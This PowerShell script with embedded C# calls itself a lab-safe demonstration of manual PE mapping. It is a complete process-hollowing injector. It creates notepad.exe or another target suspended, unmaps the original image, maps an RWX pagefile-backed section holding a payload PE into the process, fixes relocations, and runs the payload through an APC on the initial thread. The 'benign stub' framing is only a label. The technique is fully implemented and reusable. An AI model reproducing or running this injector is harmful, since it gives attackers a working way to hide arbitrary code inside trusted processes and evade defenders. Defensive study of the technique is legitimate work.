<#
.SYNOPSIS
    Lab-safe section-backed PE32+ manual mapping demonstration.

.DESCRIPTION
    Demonstrates copying a benign no-import PE32+ payload into a pagefile-backed
    section using the PE in-memory image layout, not the raw on-disk layout.
#>

[CmdletBinding()]
param(
    [string]$PayloadPath = "payload.exe",
    [string]$TargetBinary = "C:\Windows\System32\notepad.exe",
    [switch]$ValidateOnly
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct CONTEXT64 {
    public ulong P1Home; public ulong P2Home; public ulong P3Home; public ulong P4Home; public ulong P5Home; public ulong P6Home;
    public uint ContextFlags; public uint MxCsr;
    public ushort SegCs; public ushort SegDs; public ushort SegEs; public ushort SegFs; public ushort SegGs; public ushort SegSs;
    public uint EFlags;
    public ulong Dr0; public ulong Dr1; public ulong Dr2; public ulong Dr3; public ulong Dr6; public ulong Dr7;
    public ulong Rax; public ulong Rcx; public ulong Rdx; public ulong Rbx; public ulong Rsp; public ulong Rbp; public ulong Rsi; public ulong Rdi;
    public ulong R8; public ulong R9; public ulong R10; public ulong R11; public ulong R12; public ulong R13; public ulong R14; public ulong R15; public ulong Rip;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] FltSave;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 416)] public byte[] VectorRegister;
    public ulong VectorControl; public ulong DebugControl; public ulong LastBranchToRip; public ulong LastBranchFromRip; public ulong LastExceptionToRip; public ulong LastExceptionFromRip;
}

[StructLayout(LayoutKind.Sequential)]
public struct CONTEXT_ARM64 {
    public uint ContextFlags; public uint Cpsr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 31)] public ulong[] X;
    public ulong Sp; public ulong Pc;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] V;
    public uint Fpcr; public uint Fpsr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public uint[] Bcr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public ulong[] Bvr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)] public uint[] Wcr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)] public ulong[] Wvr;
}

[StructLayout(LayoutKind.Sequential)]
public struct UNICODE_STRING {
    public ushort Length;
    public ushort MaximumLength;
    public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct OBJECT_ATTRIBUTES {
    public uint Length;
    public IntPtr RootDirectory;
    public IntPtr ObjectName;
    public uint Attributes;
    public IntPtr SecurityDescriptor;
    public IntPtr SecurityQualityOfService;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION {
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public int BasePriority;
    public IntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}

public static class NtNative {
    public const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    public const ushort IMAGE_FILE_MACHINE_ARM64 = 0xAA64;
    public const uint CONTEXT_AMD64_INTEGER = 0x100002;
    public const uint CONTEXT_AMD64_CONTROL_INTEGER = 0x100003;
    public const uint CONTEXT_ARM64_INTEGER = 0x00400002;
    public const uint CONTEXT_ARM64_CONTROL_INTEGER = 0x00400003;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint SECTION_ALL_ACCESS = 0xF001F;
    public const uint SEC_COMMIT = 0x08000000;
    public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
    public const uint VIEW_UNMAP = 2;
    public const uint ProcessBasicInformation = 0;
    public const uint CREATE_SUSPENDED = 0x00000004;

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateSection(out IntPtr SectionHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref long MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll")]
    public static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEXW si, out PROCESS_INFORMATION pi);

    [DllImport("ntdll.dll")]
    public static extern uint NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
    public static extern bool GetThreadContext64(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
    public static extern bool GetThreadContextArm64(IntPtr hThread, ref CONTEXT_ARM64 lpContext);

    [DllImport("ntdll.dll")]
    public static extern uint NtQueryInformationProcess(IntPtr ProcessHandle, uint ProcessInformationClass, out PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint GetLastError();

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFOEXW {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
        public IntPtr lpAttributeList;
    }
}
"@

function Write-Log {
    param([ValidateSet("INFO", "OK", "WARN")] [string]$Level, [string]$Message)
    Write-Host "[$Level] $Message"
}

function Assert-Range {
    param([string]$Name, [UInt64]$Offset, [UInt64]$Length, [UInt64]$Total)
    if ($Offset -gt $Total -or $Length -gt ($Total - $Offset)) {
        throw "$Name is outside bounds: offset=0x$('{0:X}' -f $Offset), length=0x$('{0:X}' -f $Length), total=0x$('{0:X}' -f $Total)"
    }
}

function Read-UInt16 {
    param([byte[]]$Bytes, [int]$Offset)
    Assert-Range "UInt16 read" $Offset 2 $Bytes.Length
    [BitConverter]::ToUInt16($Bytes, $Offset)
}

function Read-UInt32 {
    param([byte[]]$Bytes, [int]$Offset)
    Assert-Range "UInt32 read" $Offset 4 $Bytes.Length
    [BitConverter]::ToUInt32($Bytes, $Offset)
}

function Read-UInt64 {
    param([byte[]]$Bytes, [int]$Offset)
    Assert-Range "UInt64 read" $Offset 8 $Bytes.Length
    [BitConverter]::ToUInt64($Bytes, $Offset)
}

function Read-Ascii {
    param([byte[]]$Bytes, [int]$Offset, [int]$Length)
    Assert-Range "ASCII read" $Offset $Length $Bytes.Length
    [System.Text.Encoding]::ASCII.GetString($Bytes, $Offset, $Length).Trim([char]0)
}

function Read-PeImage {
    param([byte[]]$Bytes)

    if ($Bytes.Length -lt 0x40) { throw "Payload is too small for a DOS header" }
    if ((Read-UInt16 $Bytes 0) -ne 0x5A4D) { throw "DOS header signature is not MZ" }

    $e_lfanew = [int](Read-UInt32 $Bytes 0x3C)
    Assert-Range "NT headers" $e_lfanew 0x18 $Bytes.Length
    if ((Read-UInt32 $Bytes $e_lfanew) -ne 0x00004550) { throw "NT header signature is not PE\0\0" }

    $coffOffset = $e_lfanew + 4
    $machineType = Read-UInt16 $Bytes ($coffOffset + 0)
    $numberOfSections = Read-UInt16 $Bytes ($coffOffset + 2)
    $sizeOfOptionalHeader = Read-UInt16 $Bytes ($coffOffset + 16)
    $characteristics = Read-UInt16 $Bytes ($coffOffset + 18)
    if ($numberOfSections -eq 0) { throw "COFF header reports zero sections" }

    $optionalHeaderOffset = $coffOffset + 20
    Assert-Range "OptionalHeader" $optionalHeaderOffset $sizeOfOptionalHeader $Bytes.Length
    $magic = Read-UInt16 $Bytes ($optionalHeaderOffset + 0x0)
    if ($magic -ne 0x20B) { throw "Only PE32+ OptionalHeader is supported; got magic 0x$('{0:X}' -f $magic)" }
    if ($sizeOfOptionalHeader -lt 0xF0) { throw "PE32+ OptionalHeader is too small for data directories" }

    $addressOfEntryPoint = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x10)
    $imageBase = Read-UInt64 $Bytes ($optionalHeaderOffset + 0x18)
    $sectionAlignment = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x20)
    $fileAlignment = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x24)
    $sizeOfImage = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x38)
    $sizeOfHeaders = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x3C)
    $numberOfRvaAndSizes = Read-UInt32 $Bytes ($optionalHeaderOffset + 0x6C)

    if ($sectionAlignment -eq 0 -or $fileAlignment -eq 0) { throw "SectionAlignment and FileAlignment must be non-zero" }
    if ($sizeOfHeaders -eq 0 -or $sizeOfHeaders -gt $Bytes.Length) { throw "SizeOfHeaders is invalid: 0x$('{0:X}' -f $sizeOfHeaders)" }
    if ($sizeOfImage -eq 0 -or $sizeOfImage -lt $sizeOfHeaders) { throw "SizeOfImage is invalid: 0x$('{0:X}' -f $sizeOfImage)" }
    if ($addressOfEntryPoint -eq 0 -or $addressOfEntryPoint -ge $sizeOfImage) { throw "AddressOfEntryPoint RVA is invalid: 0x$('{0:X}' -f $addressOfEntryPoint)" }

    $dataDirectoryOffset = $optionalHeaderOffset + 0x70
    $importDirectory = [pscustomobject]@{ VirtualAddress = 0; Size = 0 }
    $baseRelocDirectory = [pscustomobject]@{ VirtualAddress = 0; Size = 0 }
    if ($numberOfRvaAndSizes -gt 1) {
        $importDirectory = [pscustomobject]@{
            VirtualAddress = Read-UInt32 $Bytes ($dataDirectoryOffset + 8)
            Size = Read-UInt32 $Bytes ($dataDirectoryOffset + 12)
        }
    }
    if ($numberOfRvaAndSizes -gt 5) {
        $baseRelocDirectory = [pscustomobject]@{
            VirtualAddress = Read-UInt32 $Bytes ($dataDirectoryOffset + 40)
            Size = Read-UInt32 $Bytes ($dataDirectoryOffset + 44)
        }
    }

    $sectionHeadersOffset = $optionalHeaderOffset + $sizeOfOptionalHeader
    Assert-Range "Section headers" $sectionHeadersOffset ([UInt64]$numberOfSections * 40) $Bytes.Length
    $sections = @()
    for ($i = 0; $i -lt $numberOfSections; $i++) {
        $offset = $sectionHeadersOffset + ($i * 40)
        $name = Read-Ascii $Bytes $offset 8
        $virtualSize = Read-UInt32 $Bytes ($offset + 8)
        $virtualAddress = Read-UInt32 $Bytes ($offset + 12)
        $sizeOfRawData = Read-UInt32 $Bytes ($offset + 16)
        $pointerToRawData = Read-UInt32 $Bytes ($offset + 20)
        $sectionCharacteristics = Read-UInt32 $Bytes ($offset + 36)

        if ($virtualAddress -ge $sizeOfImage) { throw "Section $name VirtualAddress is outside SizeOfImage" }
        $mappedSize = [Math]::Max([UInt32]$virtualSize, [UInt32]$sizeOfRawData)
        if ($mappedSize -gt 0) { Assert-Range "Section $name virtual bounds" $virtualAddress $mappedSize $sizeOfImage }
        if ($sizeOfRawData -gt 0) { Assert-Range "Section $name raw data" $pointerToRawData $sizeOfRawData $Bytes.Length }

        $sections += [pscustomobject]@{
            Name = $name
            VirtualSize = $virtualSize
            VirtualAddress = $virtualAddress
            SizeOfRawData = $sizeOfRawData
            PointerToRawData = $pointerToRawData
            Characteristics = $sectionCharacteristics
        }
    }

    if ($importDirectory.VirtualAddress -ne 0 -and $importDirectory.Size -ne 0) {
        throw "Import Directory is non-empty. This demo requires a no-import benign stub payload; import resolution is intentionally not implemented."
    }

    [pscustomobject]@{
        E_lfanew = $e_lfanew
        Machine = $machineType
        NumberOfSections = $numberOfSections
        SizeOfOptionalHeader = $sizeOfOptionalHeader
        Characteristics = $characteristics
        Magic = $magic
        ImageBase = $imageBase
        AddressOfEntryPoint = $addressOfEntryPoint
        SectionAlignment = $sectionAlignment
        FileAlignment = $fileAlignment
        SizeOfHeaders = $sizeOfHeaders
        SizeOfImage = $sizeOfImage
        ImportDirectory = $importDirectory
        BaseRelocDirectory = $baseRelocDirectory
        Sections = $sections
    }
}

function New-MappedImageBytes {
    param([byte[]]$Payload, [object]$Pe)

    $image = New-Object byte[] $Pe.SizeOfImage
    [Array]::Copy($Payload, 0, $image, 0, [int]$Pe.SizeOfHeaders)
    foreach ($section in $Pe.Sections) {
        if ($section.SizeOfRawData -gt 0) {
            [Array]::Copy($Payload, [int]$section.PointerToRawData, $image, [int]$section.VirtualAddress, [int]$section.SizeOfRawData)
        }
        if ($section.VirtualSize -gt $section.SizeOfRawData) {
            $zeroStart = [UInt64]$section.VirtualAddress + [UInt64]$section.SizeOfRawData
            $zeroLength = [UInt64]$section.VirtualSize - [UInt64]$section.SizeOfRawData
            Assert-Range "Section $($section.Name) zero-fill" $zeroStart $zeroLength $Pe.SizeOfImage
        }
    }

    $image
}

function Apply-BaseRelocations {
    param([byte[]]$Image, [object]$Pe, [Int64]$Delta)

    if ($Delta -eq 0) {
        Write-Log OK "Payload mapped at preferred ImageBase; relocations not needed"
        return
    }

    $directory = $Pe.BaseRelocDirectory
    if ($directory.VirtualAddress -eq 0 -or $directory.Size -eq 0) {
        throw "Mapped base differs from OptionalHeader.ImageBase by 0x$('{0:X}' -f $Delta), but no base relocation directory is present. Relocations are required."
    }

    Assert-Range "Base relocation directory" $directory.VirtualAddress $directory.Size $Pe.SizeOfImage
    $cursor = [int]$directory.VirtualAddress
    $end = [int]($directory.VirtualAddress + $directory.Size)
    $patched = 0

    while ($cursor -lt $end) {
        Assert-Range "Relocation block header" $cursor 8 $Image.Length
        $pageRva = [BitConverter]::ToUInt32($Image, $cursor)
        $blockSize = [BitConverter]::ToUInt32($Image, $cursor + 4)
        if ($blockSize -lt 8 -or ($cursor + $blockSize) -gt $end) {
            throw "Invalid relocation block at RVA 0x$('{0:X}' -f $cursor)"
        }

        $entryCount = ($blockSize - 8) / 2
        for ($i = 0; $i -lt $entryCount; $i++) {
            $entry = [BitConverter]::ToUInt16($Image, $cursor + 8 + ($i * 2))
            $type = $entry -shr 12
            $offset = $entry -band 0x0FFF
            if ($type -eq 0) { continue }
            if ($type -ne 10) {
                throw "Unsupported relocation type $type at block RVA 0x$('{0:X}' -f $pageRva). Only IMAGE_REL_BASED_DIR64 is supported."
            }

            $patchRva = [UInt64]$pageRva + [UInt64]$offset
            Assert-Range "IMAGE_REL_BASED_DIR64 relocation target" $patchRva 8 $Image.Length
            $currentValue = [BitConverter]::ToUInt64($Image, [int]$patchRva)
            $newValue = [UInt64]([Int64]$currentValue + $Delta)
            [BitConverter]::GetBytes($newValue).CopyTo($Image, [int]$patchRva)
            $patched++
        }

        $cursor += [int]$blockSize
    }

    Write-Log OK "Applied $patched IMAGE_REL_BASED_DIR64 relocation(s)"
}

function New-UnicodeString {
    param([string]$String)

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($String)
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length + 2)
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $buffer, $bytes.Length)
    [System.Runtime.InteropServices.Marshal]::WriteInt16($buffer, $bytes.Length, 0)

    $unicodeString = New-Object UNICODE_STRING
    $unicodeString.Length = [ushort]$bytes.Length
    $unicodeString.MaximumLength = [ushort]($bytes.Length + 2)
    $unicodeString.Buffer = $buffer
    $unicodeString
}

function New-ObjectAttributes {
    param([UNICODE_STRING]$ObjectName, [uint]$Attributes = 0)

    $oa = New-Object OBJECT_ATTRIBUTES
    $oa.Length = [uint][System.Runtime.InteropServices.Marshal]::SizeOf($oa)
    $oa.RootDirectory = [IntPtr]::Zero
    $oa.ObjectName = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ObjectName))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ObjectName, $oa.ObjectName, $false)
    $oa.Attributes = $Attributes
    $oa.SecurityDescriptor = [IntPtr]::Zero
    $oa.SecurityQualityOfService = [IntPtr]::Zero
    $oa
}

function Read-RemotePointer {
    param([IntPtr]$ProcessHandle, [IntPtr]$Address)

    $buffer = New-Object byte[] 8
    $bytesRead = [IntPtr]::Zero
    if (-not [NtNative]::ReadProcessMemory($ProcessHandle, $Address, $buffer, 8, [ref]$bytesRead)) {
        $lastError = [NtNative]::GetLastError()
        throw "ReadProcessMemory failed at 0x$('{0:X}' -f $Address.ToInt64()): 0x$('{0:X}' -f $lastError)"
    }
    if ($bytesRead.ToInt64() -ne 8) { throw "ReadProcessMemory read $($bytesRead.ToInt64()) byte(s), expected 8" }
    [IntPtr]::new([BitConverter]::ToInt64($buffer, 0))
}

function Get-RemoteImageBase {
    param([IntPtr]$hProcess, [IntPtr]$hThread)

    try {
        $pbi = New-Object PROCESS_BASIC_INFORMATION
        $returnLength = 0
        $status = [NtNative]::NtQueryInformationProcess($hProcess, [NtNative]::ProcessBasicInformation, [ref]$pbi, [System.Runtime.InteropServices.Marshal]::SizeOf($pbi), [ref]$returnLength)
        if ($status -eq 0 -and $pbi.PebBaseAddress -ne [IntPtr]::Zero) {
            $imageBase = Read-RemotePointer $hProcess ([IntPtr]::Add($pbi.PebBaseAddress, 0x10))
            if ($imageBase -ne [IntPtr]::Zero) {
                Write-Log OK "ImageBase from NtQueryInformationProcess PEB: 0x$('{0:X}' -f $imageBase.ToInt64())"
                return $imageBase
            }
        }
        Write-Log WARN "NtQueryInformationProcess PEB method did not return ImageBase"
    }
    catch {
        Write-Log WARN "PEB ImageBase read failed: $_"
    }

    Write-Log WARN "Using thread context fallback to recover PEB pointer"
    if ($script:isArm64) {
        $ctx = New-Object CONTEXT_ARM64
        $ctx.X = New-Object ulong[] 31
        $ctx.V = New-Object byte[] 512
        $ctx.Bcr = New-Object uint[] 8
        $ctx.Bvr = New-Object ulong[] 8
        $ctx.Wcr = New-Object uint[] 2
        $ctx.Wvr = New-Object ulong[] 2
        $ctx.ContextFlags = [NtNative]::CONTEXT_ARM64_CONTROL_INTEGER
        if (-not [NtNative]::GetThreadContextArm64($hThread, [ref]$ctx)) {
            $lastError = [NtNative]::GetLastError()
            throw "GetThreadContext (ARM64) failed: 0x$('{0:X}' -f $lastError)"
        }

        $peb = [IntPtr]::new([Int64]$ctx.X[1])
        Write-Log INFO "Context fallback PEB pointer from ctx.X[1]: 0x$('{0:X}' -f $peb.ToInt64())"
        return Read-RemotePointer $hProcess ([IntPtr]::Add($peb, 0x10))
    }

    $ctx64 = New-Object CONTEXT64
    $ctx64.FltSave = New-Object byte[] 512
    $ctx64.VectorRegister = New-Object byte[] 416
    $ctx64.ContextFlags = [NtNative]::CONTEXT_AMD64_CONTROL_INTEGER
    if (-not [NtNative]::GetThreadContext64($hThread, [ref]$ctx64)) {
        $lastError = [NtNative]::GetLastError()
        throw "GetThreadContext (x64) failed: 0x$('{0:X}' -f $lastError)"
    }

    $peb64 = [IntPtr]::new([Int64]$ctx64.Rdx)
    Write-Log INFO "Context fallback PEB pointer from ctx.Rdx: 0x$('{0:X}' -f $peb64.ToInt64())"
    Read-RemotePointer $hProcess ([IntPtr]::Add($peb64, 0x10))
}

function Close-NativeHandle {
    param([IntPtr]$Handle)
    if ($Handle -ne [IntPtr]::Zero) { [void][NtNative]::CloseHandle($Handle) }
}

$script:isArm64 = [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture -eq [System.Runtime.InteropServices.Architecture]::Arm64
$expectedMachine = if ($script:isArm64) { [NtNative]::IMAGE_FILE_MACHINE_ARM64 } else { [NtNative]::IMAGE_FILE_MACHINE_AMD64 }
$archName = if ($script:isArm64) { "ARM64" } else { "x64 (AMD64)" }

Write-Log INFO "Demo mode: minimal PE manual mapping via pagefile-backed section"
Write-Log INFO "Target process defaults to notepad.exe and is configurable with -TargetBinary"
Write-Log INFO "Host architecture: $archName"

if (-not (Test-Path -LiteralPath $PayloadPath)) { throw "Payload not found: $PayloadPath" }

$payload = [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $PayloadPath))
$pe = Read-PeImage $payload
if ($pe.Machine -ne $expectedMachine) {
    throw "Payload Machine type mismatch: got 0x$('{0:X4}' -f $pe.Machine), expected 0x$('{0:X4}' -f $expectedMachine) for $archName"
}

$entryPointVaAtPreferredBase = [UInt64]$pe.ImageBase + [UInt64]$pe.AddressOfEntryPoint
Write-Log OK "Payload architecture and PE32+ headers validated"
Write-Log INFO "DOS e_lfanew: 0x$('{0:X}' -f $pe.E_lfanew)"
Write-Log INFO "COFF Machine: 0x$('{0:X4}' -f $pe.Machine); Sections: $($pe.NumberOfSections)"
Write-Log INFO "ImageBase: 0x$('{0:X}' -f $pe.ImageBase)"
Write-Log INFO "AddressOfEntryPoint RVA: 0x$('{0:X}' -f $pe.AddressOfEntryPoint)"
Write-Log INFO "Computed entrypoint VA at preferred base: 0x$('{0:X}' -f $entryPointVaAtPreferredBase)"
Write-Log INFO "SizeOfHeaders: 0x$('{0:X}' -f $pe.SizeOfHeaders); SizeOfImage: 0x$('{0:X}' -f $pe.SizeOfImage)"
Write-Log INFO "SectionAlignment: 0x$('{0:X}' -f $pe.SectionAlignment); FileAlignment: 0x$('{0:X}' -f $pe.FileAlignment)"
foreach ($section in $pe.Sections) {
    Write-Log INFO "Section $($section.Name): raw 0x$('{0:X}' -f $section.PointerToRawData)/0x$('{0:X}' -f $section.SizeOfRawData) -> RVA 0x$('{0:X}' -f $section.VirtualAddress)/0x$('{0:X}' -f $section.VirtualSize)"
}

if ($ValidateOnly) {
    Write-Log OK "ValidateOnly requested; exiting before process creation"
    return
}

$unicodeString = $null
$objectAttributes = $null
$hSection = [IntPtr]::Zero
$localBase = [IntPtr]::Zero
$pi = New-Object NtNative+PROCESS_INFORMATION
$createdProcess = $false
$resumedProcess = $false

try {
    $image = New-MappedImageBytes $payload $pe

    $sectionName = "\BaseNamedObjects\PagefileParasitesLab_" + [Guid]::NewGuid().ToString("N")
    $unicodeString = New-UnicodeString -String $sectionName
    $objectAttributes = New-ObjectAttributes -ObjectName $unicodeString -Attributes [NtNative]::OBJ_CASE_INSENSITIVE
    $sectionSize = [long]$pe.SizeOfImage

    Write-Log INFO "Creating pagefile-backed section sized to SizeOfImage: 0x$('{0:X}' -f $pe.SizeOfImage)"
    $status = [NtNative]::NtCreateSection([ref]$hSection, [NtNative]::SECTION_ALL_ACCESS, [ref]$objectAttributes, [ref]$sectionSize, [NtNative]::PAGE_EXECUTE_READWRITE, [NtNative]::SEC_COMMIT, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtCreateSection failed: 0x$('{0:X}' -f $status)" }
    Write-Log OK "Section created"

    $sectionOffset = [long]0
    $viewSize = [UInt64]$pe.SizeOfImage
    $currentProcessHandle = (Get-Process -Id $PID).Handle
    $status = [NtNative]::NtMapViewOfSection($hSection, $currentProcessHandle, [ref]$localBase, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$sectionOffset, [ref]$viewSize, [NtNative]::VIEW_UNMAP, 0, [NtNative]::PAGE_EXECUTE_READWRITE)
    if ($status -ne 0) { throw "NtMapViewOfSection(self) failed: 0x$('{0:X}' -f $status)" }
    Write-Log OK "Section mapped locally at 0x$('{0:X}' -f $localBase.ToInt64())"

    $si = New-Object NtNative+STARTUPINFOEXW
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    Write-Log INFO "Creating suspended target process: $TargetBinary"
    if (-not [NtNative]::CreateProcessW($TargetBinary, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, [NtNative]::CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)) {
        $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "CreateProcessW failed: 0x$('{0:X}' -f $lastError)"
    }
    $createdProcess = $true
    Write-Log OK "Target created suspended. PID=$($pi.dwProcessId), TID=$($pi.dwThreadId)"

    $remoteImageBase = Get-RemoteImageBase -hProcess $pi.hProcess -hThread $pi.hThread
    Write-Log INFO "Unmapping original target image at 0x$('{0:X}' -f $remoteImageBase.ToInt64())"
    $status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $remoteImageBase)
    if ($status -ne 0) { Write-Log WARN "NtUnmapViewOfSection returned 0x$('{0:X}' -f $status); continuing because alternate mapping may still be possible" }

    $remoteBase = [IntPtr]::new([Int64]$pe.ImageBase)
    $sectionOffset = [long]0
    $viewSize = [UInt64]$pe.SizeOfImage
    Write-Log INFO "Mapping section into target; preferred base 0x$('{0:X}' -f $pe.ImageBase)"
    $status = [NtNative]::NtMapViewOfSection($hSection, $pi.hProcess, [ref]$remoteBase, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$sectionOffset, [ref]$viewSize, [NtNative]::VIEW_UNMAP, 0, [NtNative]::PAGE_EXECUTE_READWRITE)

    if ($status -ne 0) {
        Write-Log WARN "Preferred-base remote map failed: 0x$('{0:X}' -f $status). Retrying with OS-chosen base."
        $remoteBase = [IntPtr]::Zero
        $sectionOffset = [long]0
        $viewSize = [UInt64]$pe.SizeOfImage
        $status = [NtNative]::NtMapViewOfSection($hSection, $pi.hProcess, [ref]$remoteBase, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$sectionOffset, [ref]$viewSize, [NtNative]::VIEW_UNMAP, 0, [NtNative]::PAGE_EXECUTE_READWRITE)
    }
    if ($status -ne 0) { throw "NtMapViewOfSection(remote) failed: 0x$('{0:X}' -f $status)" }
    Write-Log OK "Section mapped in target at 0x$('{0:X}' -f $remoteBase.ToInt64())"

    $delta = $remoteBase.ToInt64() - [Int64]$pe.ImageBase
    Apply-BaseRelocations $image $pe $delta
    [System.Runtime.InteropServices.Marshal]::Copy($image, 0, $localBase, $image.Length)
    Write-Log OK "In-memory image layout copied into section backing"

    $entryPoint = [IntPtr]::Add($remoteBase, [int]$pe.AddressOfEntryPoint)
    Write-Log INFO "Queueing initial-thread APC to mapped PE entrypoint: 0x$('{0:X}' -f $entryPoint.ToInt64())"
    $status = [NtNative]::NtQueueApcThread($pi.hThread, $entryPoint, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtQueueApcThread failed: 0x$('{0:X}' -f $status)" }

    $resumeCount = [NtNative]::ResumeThread($pi.hThread)
    if ($resumeCount -eq 0xFFFFFFFF) { throw "ResumeThread failed" }
    $resumedProcess = $true

    Write-Log OK "Minimal PE manual mapping demo started in process $($pi.dwProcessId)"
    Write-Log INFO "Payload contract: benign PE32+ no-import stub; not a normal imported EXE loader"
}
finally {
    if ($localBase -ne [IntPtr]::Zero) {
        [void][NtNative]::NtUnmapViewOfSection((Get-Process -Id $PID).Handle, $localBase)
    }
    Close-NativeHandle $hSection
    if ($createdProcess) {
        if (-not $resumedProcess) {
            [void][NtNative]::TerminateProcess($pi.hProcess, 1)
            Write-Log WARN "Terminated suspended target process after failure before resume"
        }
        Close-NativeHandle $pi.hThread
        Close-NativeHandle $pi.hProcess
    }
    if ($null -ne $objectAttributes -and $objectAttributes.ObjectName -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($objectAttributes.ObjectName)
    }
    if ($null -ne $unicodeString -and $unicodeString.Buffer -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unicodeString.Buffer)
    }
    Write-Log INFO "Native handles and unmanaged allocations cleaned up"
}
